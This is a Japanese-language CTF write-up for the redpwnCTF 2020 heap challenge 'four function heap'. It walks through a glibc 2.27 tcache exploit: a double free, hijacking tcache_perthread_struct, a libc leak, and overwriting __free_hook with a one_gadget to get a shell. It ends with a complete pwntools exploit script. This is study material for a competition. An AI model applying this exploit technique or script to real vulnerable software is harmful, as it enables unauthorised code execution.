---
tags: pwn
---


# redpwnCTF 2020 - four function heap

redpwn CTF 2020に出ていたので更新を止めていました。再開第1段は今回Heap問題を1問解いたのでそのWriteupになります。

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/redpwn/redpwnctf-2020-challenges>

## Writeup

### Outline

libc 2.27, 可変サイズmalloc, 保持ポインタ1つ(インデックスを入力できるが0以外受け付けない)とここまで見れば特に難しいことは無いHeap問題。
面倒なのは実行可能な"コマンドの総数"が15回までで悠長にheap leak -> 偽装チャンク -> libc leak -> `__free_hook`書き換えとやっていると直ぐにこの回数に到達する。
色々削減方法はあるみたいだが今回は`tcache_perthread_struct`をチャンクとして確保し、entriesメンバを編集することでほぼ任意のサイズのmallocで任意アドレスが返るようにした。

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

コマンドはadd(create+edit), show, deleteの3つ、delete時にポインタを破棄しないのでDouble Freeが出来る、ついでにshowでUAF(read)が出来る。
これらのコマンドには使用制限が付いており、3つのコマンドの"合計で"15回までしか実行出来ない。
インデックスがして指定できるようになっているが0しか指定できない(負数と正数を指定すると即exitする)。よって実質保持ポインタは1つである。
指定できるサイズは0x1000までと潤沢。しかし次で説明する謎仕様によって0x1f0程度しかeditが出来ない。
このバイナリは`p = malloc(size); res = read(0, p, size - 1)`のようなコードによって確保すると同時に書き込みを行っている。そして本来だったら`p[res] = 0`としてヌルバイトを付与しているはずだった。しかし、設計ミスでポインタを格納しているグローバル配列`ptrs`に誤ってそれを適用してしまい、`ptrs[res] = 0`といる。
これだとただの終端文字の付与ミスで終わるかもしれないが思わぬ弊害がある。それは`res`の大きさによってはページを超えてメモリアクセスしようとしてしまい、セグメント違反を起こしてプログラムが落ちる。
`ptrs`が配置されるのは.bssセクションで、だいたいこのセクションや.dataセクションがまとめて1つのページに配置される。そのサイズは0x1000であるので`&ptrs + res * 8`がその境界を跨ごうとした時、つまりだいたい`res = 0x200`ぐらいになるとセグメント違反を起こす(実際は`&ptrs`の値によるのでもう少し小さく`0x1f0`とちょっとぐらいだった)。`res`は書き込んだバイト数なので`0x200`以上の書き込みは出来ないことになる。この仕様によって潤沢なサイズを利用してOverlapさせた巨大チャンクを1発で作るといったことは出来ない。

ちなみに何も書き込まなかった場合、`ptrs[0] = 0`となり、確保していたポインタが消える。ポインタに影響を与える唯一の仕様だが、回数の無駄遣いなので用途は無い。

### カウンタ破壊を利用したUnsorted Bin送り

Unsorted Binにチャンクを送る際にtcacheを事前に7つ埋めておくというテクニックがある(ex. [SECCON CTF 2019 Quals - One](/3uaJoXJeTB6FbzJ5p-QJ7Q))。これを素直に実行する場合、事前にdeleteを最低でも7回発生させる必要があり、回数制限が存在する今回は使いにくい。一方で(先程例にあげた記事でも書いているが)Double Freeでtcache poisoningを行う場合、deleteを2回しか行わないと使用したtcacheのカウンタが0xffになって、以降そこへチャンクを送ることは出来なくなる。これを利用すればtcache poisoningで任意アドレスをチャンクとして確保するついでにそのアドレスをUnsorted Binへ送ることが出来る。

Double Freeを引き起こして、あるサイズ(ここでは`s`)のtcacheを循環させた状態から始める。この時このサイズのtcacheのカウンタは2である。

```
~ tcache(size: s): count: 2 ~
top -> A -> A -> ...
```

ここでサイズ`s`のチャンクを確保するmallocを発動させ、`x`を書き込む(`*x = 0`とする)。カウンタは1になる。

```
~ tcache(size: s): count: 1 ~
top -> A -> x
```

再度mallocする、カウンタは0になる。

```
~ tcache(size: s): count; 0 =
top -> x
```

再度mallocする、カウンタは-1, つまり0xffになる。この時チャンクとして`x`を確保しここを指すポインタ`p`を保持しているとする。
```
*p = x
~ tcache(size: s): count: -1 = 0xff ~
top -> (null)
```

ここで`x`のサイズが`s`であれば、`free(p)`によって`x`がdeleteされた際に、すでにカウンタが8以上であるtcacheに入ることはないので(`x > 0x7f`であればfastbinにも入らず、)Unsorted Binに入る。
今回は回数制限が厳しく、tcache埋めは出来ないのでこの方法を用いた。ついでにUnsorted Binへ放り込むことが出来るぐらい大きなチャンクを作る手間も省いている。

### tcache_perthread_struct

heap領域を利用する際、一番初めにチャンクサイズ0x250のチャンクが作られる。
次の例は`malloc(0x28)`等でサイズ0x30のチャンクを生成した直後のヒープ領域の様子である

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x7ffff1768000      0x0                 0x250                Used                None              None
0x7ffff1768250      0x0                 0x30                 Used                None              None
gdb-peda$ 
```
確かにサイズ0x30のチャンクの他にサイズ0x250のチャンクが存在している。

このチャンクには意味があり、`tcache_perthread_struct`というtcacheを管理する構造体が入る。この構造体は次のように定義されている。

```clike
/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

`counts`メンバは各サイズのtcacheのカウンタ(どれだけのチャンクが繋がれているか)の配列になる。`entries`メンバは各サイズのtcache先頭entryへのポインタの配列になる。これらの配列のインデックスはサイズと対応しており、`idx = (size - 0x20) / 0x10`の関係にある。

今回は回数制限(とadd時の書き込みバイト制限)以外に目立った制限は無く、heap leakが可能な上にleak箇所からの距離が分かるアドレスならtcache poisoningでチャンクとして確保することができる。
したがってheap leak箇所からの距離が0x250と分かっているこの`tcache_perthread_struct`をチャンクとして確保する事ができ、ここを編集することで各サイズのカウンタや先頭entryを自由に指定する事ができる。

### __free_hook書き換え準備

無事に`tcache_perthread_struct`をチャンクとして確保できた後にしたいのは(showによるlibc leakの次に)`__free_hook`の書き換えである。
いつもならDouble Freeを利用したtcache poisoningをしているところだが普通にしているとadd -> delete -> delete -> add -> add -> addで6回のコマンドを叩く必要がありそうなので今回は`tcache_perthread_struct`のentriesを書き換えることで対応するサイズのmallocが走った時に優先的に確保されるようにして書き換えを行う。

ところで、`tcache_perthread_struct`をチャンクとして確保する(+書き込みを行う)タイミングはheap leakの後である。ということはまだUnsorted Binによるlibc leakは済んでいない。よってこの段階ではentryに`__free_hook`のアドレスを仕込んで次のaddで回収ということは出来ない。というわけでlibc leak後にもentryを弄る必要がある。
後述するが、libc leakによって一部サイズのtcacheのカウンタが壊れてしまうのでそれの影響を受けないサイズを2つ選び`s_0, s_1`とおいておく。これらに対応する`tcache_perthread_struct`のインデックスを`i_0, i_1`とおく。
heap leakのおかげで`&entries[i_1]`は判明する。ということはこれを`entries[i_0]`に仕込んでおけば、libc leak以後にサイズ`s_0`のチャンクを得るようmallocを走らせると`&entries[i_1]`がチャンクとして確保されるのでeditによって値を仕込むことが出来る。

ちなみに`tcache_perthread_struct`をチャンクとして確保する時の書き込みだが、freeするサイズ(0x250)のtcacheのカウンタを8未満にしてしまうとUnsorted Binでなくtcacheに呑まれてしまう。entriesを書き換える都合上、カウンタ部分も当然値を仕込まなくてはならないのでここを小さくしすぎないように気をつける。

### libc leak後のtcache

今回は前述の`tcache_perthread_struct`をチャンクとして確保し、Unsorted Binへ送った。すると例によって`main_arena->top`に対応するアドレスが判明する。
ところで先程の説明でtcache_perthread_structの先頭にはカウンタの配列が入っていると述べたが、Unsorted Binに送られたことでここが`main_arena->top`のアドレスで上書きされてしまう。
値にもよるが大抵、8以上のバイトが入るのでチャンクのfd, bkと重なっているインデックスのカウンタは大きな値となり、これ以上tcacheに入らなくなる。というわけでここから外れたインデックスに対応するサイズのtcacheを使う。
次の例はUnsorted Binに`tcache_perthread_struct`を放り込んだ時のチャンクの様子である。

```
gdb-peda$ x/16gx 0x7fffe5272000
0x7fffe5272000: 0x0000000000000000      0x0000000000000251
0x7fffe5272010: 0x00007f8611febca0      0x00007f8611febca0
0x7fffe5272020: 0x0000000000000000      0x0000000000000000
0x7fffe5272030: 0x00000000ff000000      0x0000000000000000
0x7fffe5272040: 0x0000000000000000      0x0000000000000000
0x7fffe5272050: 0x0000000000000000      0x0000000000000000
0x7fffe5272060: 0x0000000000000000      0x0000000000000000
0x7fffe5272070: 0x0000000000000000      0x0000000000000000
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x7fffe52724a0 (size : 0x20b60) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x7fffe5272000 (size : 0x250)
(0x20)   tcache_entry[0](160): 0
(0x30)   tcache_entry[1](188): 0
(0x40)   tcache_entry[2](254): 0
(0x50)   tcache_entry[3](17): 0
(0x60)   tcache_entry[4](134): 0
(0x70)   tcache_entry[5](127): 0
(0x80)   tcache_entry[6](0): 0x7fffe5272088 (overlap chunk with 0x7fffe5272000(freed) )
(0xa0)   tcache_entry[8](160): 0
(0xb0)   tcache_entry[9](188): 0
(0xc0)   tcache_entry[10](254): 0
(0xd0)   tcache_entry[11](17): 0
(0xe0)   tcache_entry[12](134): 0
(0xf0)   tcache_entry[13](127): 0
(0x250)   tcache_entry[35](255): 0
```

サイズの小さいtcacheのカウンタが軒並み埋まっているのが分かる。
0x100以降のサイズだったら空いてるのでここを使っても良いのだが、今回はアドレス空間が48bitより、fd, bkメンバの下位2バイトが確実に`00`であるということを利用してここに対応するサイズのtcacheを使った。

### まとめ

長くなった、ここまでの流れを総括すると

1. サイズ0x250のチャンクをDouble FreeしてUAF(read)をする。これでheap leakができるので`tcache_perthread_struct`のアドレスを特定する(leak - 0x250)
2. 1で既にDouble Freeが済んでいるのでこれを利用して先程特定した`tcache_perthread_struct`をaddでチャンクとして確保する。この時点でサイズ0x250のtcacheのカウンタは0xffになりこれ以上チャンクは入らなくなる。
3. 確保時に書き込みが出来るので0x250のカウンタを崩さないようにしながら今後も使えるサイズのentriesに別のサイズのentiresに対応するアドレスを仕込む(entries[i_0] = &entries[i_1])。
4. deleteしてUnsorted Binに送ってからshowすることでlibc leakする。この地点で小さいサイズのtcacheのカウンタは大きい値になるため使えなくなる
5. 3で仕込んだ`entries[i_0]`に対応するサイズのチャンクをaddで取得する。この際チャンクとして確保されるのは`&entries[i_1]`になる。同時に書き込みで`__free_hook`のアドレスを仕込む。
6. 5で仕込んだ`entries[i_1]`に対応するサイズのチャンクを取得する。`__free_hook`のアドレスがチャンクとして取得出来るのでOne Gadgetを仕込む。
7. freeしてシェルを取る

ちなみにこの一連の手順で12回のコマンドを叩いた、多分これが1番少ないと思います

## Code

```python
from pwn import process, remote, p64, u64, ELF

"""
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""
"""
    alloc: create + edit, 可変サイズ, ポインタ1つ(0)
    free: ポインタクリア無し, double free可能
    show: uaf可能
    コマンド使用可能回数: 0xe
"""


def select(s, sel, c=b"{{prompts.menu}}: "):
    s.recvuntil(c)
    s.sendline(sel)


def create(s, size, data=b"junk", idx=0):
    select(s, b"1")
    s.recvuntil(b": ")
    s.sendline(str(idx))
    s.recvuntil(b": ")
    s.sendline(str(size))
    s.recvuntil(b": ")
    s.send(data)


def show(s, idx=0):
    select(s, b"3")
    s.recvuntil(b": ")
    s.sendline(str(idx))
    res = s.recvline().rstrip()

    return res


def delete(s, idx=0):
    select(s, b"2")
    s.recvuntil(b": ")
    s.sendline(str(idx))


if __name__ == '__main__':
    target = "2020.redpwnc.tf"
    port = 31774
    libc = ELF("./libc-2.27.so")
    system_libc = libc.symbols["system"]
    free_fook_libc = libc.symbols["__free_hook"]
    main_arena_libc = 0x3ebc40
    one_gadget = 0x4f322

    # s = process("./four-function-heap")
    s = remote(target, port)

    # heap leak
    create(s, 0x248)
    delete(s)
    delete(s)
    leak = u64(show(s).ljust(8, b"\x00"))  # count: 4
    print(hex(leak))

    payload = b""

    # tamper counts
    payload += p64(0) * 4
    payload += p64(0xff000000) + p64(0)
    payload += p64(0) * 2

    # tamper entry
    payload += p64(0) * 6
    # after libc leak, this address will be got by malloc(0x78)
    payload += p64(leak - 0x1d8)

    print(hex(len(payload)))
    create(s, 0x248, p64(leak - 0x250))
    create(s, 0x248)
    create(s, 0x248, payload)
    delete(s)
    libc_addr = u64(show(s).ljust(8, b"\x00")) - \
        main_arena_libc - 0x60  # count: 9
    free_hook_addr = libc_addr + free_fook_libc
    one_gadget_addr = libc_addr + one_gadget
    print(hex(libc_addr))
    create(s, 0x78, p64(free_hook_addr))
    create(s, 0x88, p64(one_gadget_addr))  # count: 11
    delete(s)  # count: 12

    s.interactive()

```

## Flag

`flag{g3n3ric_f1ag_1n_1e3t_sp3ak}`

## 感想

実戦で初Heap問題提出できて嬉しかったです。
ただ終了後に公式含め他のWriteup読んでも意味がわからなかったのでgdbでメモリ覗きながら検証する予定です。
ところでたったの12回で突破できたんですがもしかして最小手順じゃないでしょうか?

## 参考文献

* [yoshi-pwn 1Q - ふるつき](https://furutsuki.hatenablog.com/entry/2020/05/28/184656#CSAW-CTF-2019-Quals---popping-caps-1): これ読まなかったら多分`tcache_perthread_struct`に気付くことが無かった